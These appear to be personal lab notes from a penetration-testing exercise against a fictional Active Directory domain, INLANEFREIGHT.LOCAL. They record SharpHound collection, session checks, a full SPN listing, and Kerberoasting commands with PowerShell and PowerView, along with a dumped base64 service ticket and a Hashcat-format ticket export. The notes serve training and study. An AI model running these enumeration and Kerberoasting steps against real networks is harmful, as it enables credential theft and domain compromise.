- `whoami /all`
	- `SeImpersonatePrivilege` enabled
![[Pasted image 20240904134658.png]]
- `systeminfo`
![[Pasted image 20240904135226.png]]
# Bloodhound
- Run `SharpHound.exe`
```
.\SharpHound.exe -c all
```
- based on blood hound of NT/SYSTEM there is path to domains from MS01
![[Pasted image 20240905073926.png]]

#  Active sessions
- `qwinsta` and `klist sessions` - hporter is active
	- I can see that `INLANEFREIGHT\hporter` is `Kerberos:Interactive`
![[Pasted image 20240905090820.png]]
![[Pasted image 20240905091003.png]]
#  SPNs Enuemration

```
Checking domain DC=INLANEFREIGHT,DC=LOCAL
CN=DC01,OU=Domain Controllers,DC=INLANEFREIGHT,DC=LOCAL
        Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/DC01.INLANEFREIGHT.LOCAL
        ldap/DC01.INLANEFREIGHT.LOCAL/ForestDnsZones.INLANEFREIGHT.LOCAL
        ldap/DC01.INLANEFREIGHT.LOCAL/DomainDnsZones.INLANEFREIGHT.LOCAL
        DNS/DC01.INLANEFREIGHT.LOCAL
        GC/DC01.INLANEFREIGHT.LOCAL/INLANEFREIGHT.LOCAL
        RestrictedKrbHost/DC01.INLANEFREIGHT.LOCAL
        RestrictedKrbHost/DC01
        RPC/a6c70d57-79f1-4148-ac42-c0c106f83e56._msdcs.INLANEFREIGHT.LOCAL
        HOST/DC01/INLANEFREIGHT
        HOST/DC01.INLANEFREIGHT.LOCAL/INLANEFREIGHT
        HOST/DC01
        HOST/DC01.INLANEFREIGHT.LOCAL
        HOST/DC01.INLANEFREIGHT.LOCAL/INLANEFREIGHT.LOCAL
        E3514235-4B06-11D1-AB04-00C04FC2DCD2/a6c70d57-79f1-4148-ac42-c0c106f83e56/INLANEFREIGHT.LOCAL
        ldap/DC01/INLANEFREIGHT
        ldap/a6c70d57-79f1-4148-ac42-c0c106f83e56._msdcs.INLANEFREIGHT.LOCAL
        ldap/DC01.INLANEFREIGHT.LOCAL/INLANEFREIGHT
        ldap/DC01
        ldap/DC01.INLANEFREIGHT.LOCAL
        ldap/DC01.INLANEFREIGHT.LOCAL/INLANEFREIGHT.LOCAL
CN=krbtgt,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
        kadmin/changepw
CN=mssqlsvc,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
        MSSQLSvc/DB01.inlanefreight.local:1433
CN=svc_sql,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
        MSSQLSvc/SQL01.inlanefreight.local:1433
CN=sqlprod,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
        MSSQLSvc/SQL02.inlanefreight.local:1433
CN=sqldev,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
        MSSQLSvc/SQL-DEV01.inlanefreight.local:1433
CN=sqltest,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
        MSSQLSvc/DEVTEST.inlanefreight.local:1433
CN=sqlqa,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
        MSSQLSvc/QA001.inlanefreight.local:1433
CN=mssqladm,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
        MSSQLSvc/SQL-WEB01.inlanefreight.local:1433
CN=azureconnect,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
        adfsconnect/azure01.inlanefreight.local
CN=backupjob,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
        backupjob/veam001.inlanefreight.local
CN=vmwarescvc,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
        vmware/vc.inlanefreight.local
CN=sapsso,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
        SAP/APP01.inlanefreight.local
CN=sapvc,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
        SAPsvc/SAP01.inlanefreight.local
CN=ACADEMY-AEN-DEV,CN=Computers,DC=INLANEFREIGHT,DC=LOCAL
        TERMSRV/ACADEMY-AEN-DEV
        TERMSRV/ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL
        nfs/ACADEMY-AEN-DEV
        nfs/ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL
        RestrictedKrbHost/ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL
        HOST/ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL
        RestrictedKrbHost/ACADEMY-AEN-DEV
        HOST/ACADEMY-AEN-DEV
CN=ACADEMY-AEN-MS0,CN=Computers,DC=INLANEFREIGHT,DC=LOCAL
        tapinego/ACADEMY-AEN-MS0
        tapinego/ACADEMY-AEN-MS01.INLANEFREIGHT.LOCAL
        TERMSRV/ACADEMY-AEN-MS0
        TERMSRV/ACADEMY-AEN-MS01.INLANEFREIGHT.LOCAL
        RestrictedKrbHost/ACADEMY-AEN-MS01.INLANEFREIGHT.LOCAL
        HOST/ACADEMY-AEN-MS01.INLANEFREIGHT.LOCAL
        RestrictedKrbHost/ACADEMY-AEN-MS0
        HOST/ACADEMY-AEN-MS0
```

```
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/SQL-WEB01.inlanefreight.local:1433"


setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```
-  `MSSQLSvc/SQL-WEB01.inlanefreight.local:1433` tgs ticket
```
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
MzM=
```
## Vie PowerView
- `Get-DomainUser * -spn | select samaccountname`
```
samaccountname
--------------
azureconnect  
backupjob     
krbtgt        
mssqlsvc      
sqltest       
sqlqa         
sqldev        
mssqladm      
svc_sql       
sqlprod       
sapsso        
sapvc         
vmwarescvc 
```
- `Get-DomainUser -Identity mssqladm  | Get-DomainSPNTicket -Format Hashcat`
# hporter
- hporter user log in and log out constantly
	- `get-eventlog -logname Security | where { $_.Message -like "*hporter*" }`
![[Pasted image 20240909180715.png]]
